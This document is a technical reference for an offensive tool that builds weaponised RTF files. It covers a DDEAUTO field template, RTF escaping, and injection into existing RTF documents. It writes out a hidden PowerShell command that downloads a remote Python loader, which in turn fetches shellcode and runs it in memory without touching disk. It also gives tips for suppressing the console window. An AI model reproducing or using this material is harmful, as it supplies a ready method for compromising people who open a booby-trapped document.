# RTF Generator — Technical Reference

## Overview

The RTF Generator creates Rich Text Format documents containing a DDE (Dynamic Data Exchange) auto-execute field. When opened in Microsoft Word, the document prompts the user to "update links" — on accept, the embedded command runs via PowerShell, downloading and executing the Python loader without macros, templates, or VBA.

## DDE (Dynamic Data Exchange)

DDE is a legacy Windows IPC protocol that allows applications to exchange data. RTF supports DDE through field codes. The `DDEAUTO` field type auto-executes when the document is opened, unlike `DDE` which requires manual update.

### Field syntax

```rtf
{\field{\*\fldinst {DDEAUTO <application> "<arguments>"}}{\ fldrslt }}
```

- `\*\fldinst` — field instruction (hidden from the document view)
- `DDEAUTO` — auto-execute variant (fires on document open)
- `\fldrslt` — cached field result (displayed in the document body)

### RTF path escaping

RTF uses `\\` to represent a literal backslash. Since the DDE field is inside an RTF document, paths require double-escaping:

| Level | Representation | Result |
|-------|---------------|--------|
| C# string | `\\\\` | `\\` in RTF source |
| RTF parser | `\\` | `\` rendered |
| Final path | `c:\windows\system32\...` | Correct Windows path |

## Execution flow

```
Word opens RTF
  │
  ├─ Parses DDE field
  ├─ Prompts: "This document contains links … Update?"
  │
  └─ On accept:
       powershell.exe [-W Hidden] -NoP -C irm <loader_url> | python3
       │
       ├─ irm (Invoke-RestMethod) downloads the Python loader script
       ├─ Pipes output to python3
       └─ Python loader:
            ├─ Detects platform (Windows/Linux/macOS)
            ├─ Downloads agent shellcode binary
            ├─ Maps into memory (VirtualAlloc / mmap)
            └─ Executes — no files on disk
```

## Hidden vs visible window

| Mode | DDE application | Arguments | Window |
|------|----------------|-----------|--------|
| Hidden | `powershell.exe` | `-W Hidden -NoP -C irm URL \| python3` | No window |
| Visible | `powershell.exe` | `-NoP -C irm URL \| python3` | PowerShell window visible |

**Why PowerShell instead of cmd.exe:**
- `cmd.exe` always opens a visible console window — DDE provides no window style control
- PowerShell's `-W Hidden` flag suppresses the window entirely
- `irm` is native to PowerShell (no `curl` alias conflict with `Invoke-WebRequest`)
- PowerShell is available on all Windows versions since v2.0

## Custom RTF injection

When uploading an existing RTF, the DDE field is injected at the first `\pard` control word (start of the document body). This preserves:

- Font tables (`\fonttbl`)
- Color tables (`\colortbl`)
- Style sheets
- All document formatting

Fallback: if no `\pard` is found, the field is inserted before the final closing brace.

## Generated RTF structure

```rtf
{\rtf1\ansi\ansicpg1252\deff0
{\fonttbl{\f0\fswiss\fcharset0 Calibri;}}
{\colortbl;\red0\green0\blue0;}
\viewkind4\uc1\pard\lang1033\f0\fs22
{\field{\*\fldinst {DDEAUTO c:\\windows\\system32\\...\\powershell.exe "..."}}{\ fldrslt }}
\pard\sa200\sl276\slmult1\b\fs28 Document Title\b0\par
\pard\sa200\sl276\slmult1\fs22 Document body text.\par
}
```

## Word prompts

The user sees up to two prompts:

1. **"This document contains links that may refer to other files. Do you want to update this document with the data from the linked files?"** — This is the DDE update prompt. Clicking "Yes" triggers execution.

2. **"Word cannot obtain the data for the [app] [topic] link."** — Post-execution DDE error. Word tries to maintain a DDE conversation with the launched process (which isn't a DDE server). This is cosmetic and does not affect execution.

## RTF escaping

Special characters in the DDE arguments are escaped for RTF:

| Character | RTF escape |
|-----------|-----------|
| `\` | `\\` |
| `{` | `\{` |
| `}` | `\}` |
| `> U+007F` | `\uN?` (Unicode escape) |

## Limitations

- Requires Microsoft Word (LibreOffice does not execute DDE fields)
- Word security updates may disable DDE by default (registry: `HKCU\Software\Microsoft\Office\<version>\Word\Security\AllowDDE`)
- Protected View blocks DDE — the user must click "Enable Editing" first
- The DDE argument has a practical limit of ~255 bytes
